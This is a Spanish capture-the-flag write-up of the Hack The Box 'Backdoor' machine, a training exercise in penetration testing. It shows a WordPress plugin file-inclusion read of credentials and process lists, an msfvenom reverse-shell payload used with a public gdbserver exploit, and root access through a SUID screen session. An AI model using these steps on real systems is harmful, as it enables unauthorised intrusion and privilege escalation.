#  BACKDOOR MACHINE

**Autor: Christian Jimenez**

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BACKDOOR/images/1.png)


## ESCANEO Y ENUMERACION

vamos a realizar un escaneo con nmap:

```bash
nmap -p- --open -T5 - v -n 10.10.11.125 -oG allPorts
```

La salida nos muesta los sigueinets puertos:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BACKDOOR/images/2.png)

Vamos a realizar una enumeracion de los servicios en los puertos:

```bash
nmap -p22,80,1337 -sV -sC 10.10.11.125 -oN targeted
```

este es el resultado:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BACKDOOR/images/3.png)

## EXPLOTACION

veamos la pagina web:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BACKDOOR/images/4.png)

La pagina no nos dice mucho pero estamos ante un wordpress, lo sabemos gracias a wapalyzer. Enumeremos todo lo que podamos con **wpscan**:

```bash
wpscan --url http://10.10.11.125/ --enumerate u,at,ap
```

supuestamente:

- no tiene plugins instalados.
- XML-RPC esta habilitado.
- el tema es Twenty Seventeen.

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BACKDOOR/images/5.png)

muy bien podemos tirar de XML-RPC para enumerar usuarios e intentar un ataque de fuerza bruta al login y explotar el tema que tiene, tomara mucho tiempo pero lo podemos intentar. Otra cosa es que podemos comprobar si de verdad no tiene algun plugin y que sea vulnerable. Consultemos la siguiente ruta: **http://10.10.11.125/wp-content/plugins/** en esa ruta se encuentran los `plugins`.

**NOTA: esa es la ruta que normalmente se guardan plugins, para ver temas puede consultar http://10.10.11.125/wp-content/themes/"el tema que puede existir"**

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BACKDOOR/images/6.png)

hay un plugin llamado **ebook-download**, antes de tirar por XML-RPC veamos si este plugin es vulnerable a algo.

Al realizar esa busqueda vi que es vulnerable a LFI:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BACKDOOR/images/7.png)

veamos si es cierto:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BACKDOOR/images/8.png)

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BACKDOOR/images/9.png)

vemos credenciales de base de datos en ese archivo, el puerto 3306 no esta abierto hacia afuera asi que poco podemos hacer con eso, pero el LFI funciona.

una cosa que podemos hacer es ver informacion acerca del sistema a traves de la ruta **/proc**, [aqui](https://www.netspi.com/blog/technical/web-application-penetration-testing/directory-traversal-file-inclusion-proc-file-system/) hay informacion muy util hacerca de ello. 

a traves de **/proc/\[PID\]/cmdline** podemos enumera todo lo que se utilizó para invocar el proceso. Esto a veces contiene rutas útiles a los archivos de configuración, así como nombres de usuario y contraseñas. Hagamoslo con burpsuite para realizar un ataque de tipo **intruder** iterando los posibles PID y veamos si alguno nos da informacion.

nuestra PoC para ver si tenemos respuesta sera intentar ver en la respuesta del burp el **/proc/version** que nos dira la version del sistema operativo, cuando eso pase podemos cambiar por **/proc/PID/cmdline**:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BACKDOOR/images/10.png)

vemos que reemplazando por **/proc/version** no vemos nada, aumentemos mas **../../../../** y veamos:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BACKDOOR/images/11.png)

ahora si, podemos reemplazar por **/proc/PID/cmdline** y mandarlo al repeater usando un ataque de tipo **sniper** con una lista de numeros del **700** al **11000** por ejemplo:

ordenando por el **length** vemos una respuesta interesante con el PID **854** y **852**

854:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BACKDOOR/images/12.png)

vemos que se esta ejecutando un gdbserver en el puerto 1337 localmente y ese puerto figura como abierto en el servidor.

852:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BACKDOOR/images/13.png)

esta ejecutando screen, esto sirve para iniciar una sesión de pantalla y luego abrir cualquier cantidad de ventanas (terminales virtuales) dentro de esa sesión. Los procesos que se ejecutan en Pantalla continuarán ejecutándose cuando su ventana no esté visible, incluso si se desconecta.

Se esta ejecutadno con el para metro **-dmS root**:

- **-d:** no iniciar la pantalla (screen).
- **-m:** junto al parametro -d hace que la screen vaya como a segundo plano.
- **-S:** definir un nombre a la sesion en este caso **root**.

entonces por donde empezar? Veamos si hay algun exploit para **gdbserver**.

Damos con este [exploit](https://www.exploit-db.com/exploits/50539)

probemoslo esto es lo que necesitamos hacer:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BACKDOOR/images/14.png)

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.115 LPORT=4545 PrependFork=true -o rev.bin
```

```bash
python3 gdb_exploit.py 10.10.11.125:1337 rev.bin 
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BACKDOOR/images/15.png)

tenemos RCE. Hagamos un tratamiento de la TTY:

```bash
script /dev/null -c bash
Ctrl Z
stty raw -echo; fg
reset
xterm
export TERM=xterm
export SHELL=bash
```

y podemos ver la primera flag:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BACKDOOR/images/16.png)

## ELEVACION DE PRIVILEGIOS

enumerando un poco el sistema veamos permisos SUID:

```bash
find / -uid 0 -perm -4000 -type f 2>/dev/null
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BACKDOOR/images/17.png)

vemos que el binario **screen** se puede ejecutar como root. buscando un poco en google encontre [esta pagina](https://serverfault.com/questions/720357/ubuntu-allow-users-access-to-roots-screen-command-also-restrict-which-screens)

explica como ejecutar una sesion a partir del nombre de usuario y nombre de sesion:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BACKDOOR/images/18.png)

si recordamos un proceso os dio informacion acerca de **screen** y nos indicaba que creaba una nueva sesion con el nombre de la sesion y como este binario es SUID intentemos ejecutar la sesion:

```bash
screen -x root/root
```

usuario root y nombre de session root (como se mostraba en el proceso)

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BACKDOOR/images/19.png)

y listo, somos root y podemos ver la siguiente flag:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BACKDOOR/images/20.png)

